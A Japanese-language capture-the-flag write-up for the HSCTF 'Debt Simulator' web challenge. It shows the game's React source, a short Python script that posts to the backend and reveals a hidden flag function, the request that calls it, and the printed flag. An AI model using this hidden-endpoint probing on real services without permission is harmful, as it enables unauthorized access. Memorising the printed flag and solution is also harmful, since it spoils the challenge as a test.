# Debt Simulato

```
web

https://debt-simulator.web.hsctf.com/
Author: Madeleine
```

<br>

## Solution

![1](https://user-images.githubusercontent.com/47602064/83932626-c5b87580-a7de-11ea-9b9d-fe23b6f8bb65.png)

問題のページに移動するとゲーム画面が表示されました。

試しに通信を見ながら試してみます。

```http
POST /yolo_0000000000001 HTTP/1.1
Host: debt-simulator-login-backend.web.hsctf.com

```

`function=getPay`

`function=getCost`

すると`getPay`でお金が増え、`getCost`で減っています。

そして`-1000`になると負けだそうです。

![2](https://user-images.githubusercontent.com/47602064/83937770-ac2d2300-a80a-11ea-9c47-14113401ea25.png)

<br>

次に`App.js`のソースを見てみます。

```javascript
import React, { useState, useEffect } from 'react';
import Header from "./Header";
import Main from './Main';
import Message from './Message';
import Button from "./Button";
import "./App.css";

function App() {
  const [message, setMessage] = useState("Ready to Play?");
  const [runningTotal, setRunningTotal] = useState(0);
  const [buttonText, setButtonText] = useState("Start Game");


  useEffect(() => {
    if (runningTotal < -1000) {
      setMessage("You lost. You have less than $-1000. Better luck next time.");
      setButtonText("Play Again");
    } else if (runningTotal > 2000) {
      setMessage("You won. You have more than $2000. Try your luck again?");
      setButtonText("Play Again");
    } else if (runningTotal !== 0 && buttonText !== "Next Round") {
      setButtonText("Next Round");
    }
  });

  const onClick = () => {
    const isGetCost = Math.random() > 0.4 ? true : false;
    const func = isGetCost ? 'getCost' : 'getPay';
    const requestOptions = {
      method: 'POST',
      body: 'function=' + func,
      headers: { 'Content-type': 'application/x-www-form-urlencoded' }
    }

    fetch("https://debt-simulator-login-backend.web.hsctf.com/yolo_0000000000001", requestOptions)
    .then(res => res.json())
    .then(data => {
      data = data.response;
      if (buttonText === "Play Again" || buttonText === "Start Game") {
        setButtonText("Next Round");
        setRunningTotal(0);
      }
      setMessage("You have " + (isGetCost ? "paid me " : "received ") + "$" + data + ".");
      setRunningTotal(runningTotal => isGetCost ? runningTotal - data : runningTotal + data);
    });
  }

  return <div className="App">
    <Header />
    <Message message={message}/>
    <Main content={runningTotal}/>
    <Button onClick={onClick} text={buttonText}/>
  </div>;
}

export default App;
```

これソースより、合計が`2000`になれば勝ちのようです。

ですが、プログラム上普通にやっても難しそうです。

`Burp`を使って`getPay`に変更してもプログラム上変えられてしまい、意味がありませんでした。

<br>

試しに以下のプログラムを実行させてみます。

```python
#!/usr/bin/python3

import requests

url = 'http://debt-simulator-login-backend.web.hsctf.com/yolo_0000000000001'

r = requests.post(url)
source = r.text
print(source)
```

```
$ python3 solve.py 
{"functions":["getPay","getCost","getgetgetgetgetgetgetgetgetFlag"]}
```

これにより`getPay`,`getCost`の他に`getgetgetgetgetgetgetgetgetFlag`というのが隠れてあることがわかります。

<br>

なのでこれを送ってみます。

```http
POST /yolo_0000000000001 HTTP/1.1
Host: debt-simulator-login-backend.web.hsctf.com

function=getgetgetgetgetgetgetgetgetFlag
```

```http
HTTP/1.1 200 OK

{"response":"flag{y0u_f0uND_m3333333_123123123555554322221}"}
```

![3](https://user-images.githubusercontent.com/47602064/83937744-6708f100-a80a-11ea-8356-0730927c657e.png)


<br><br>

## FLAG: flag{y0u_f0uND_m3333333_123123123555554322221}
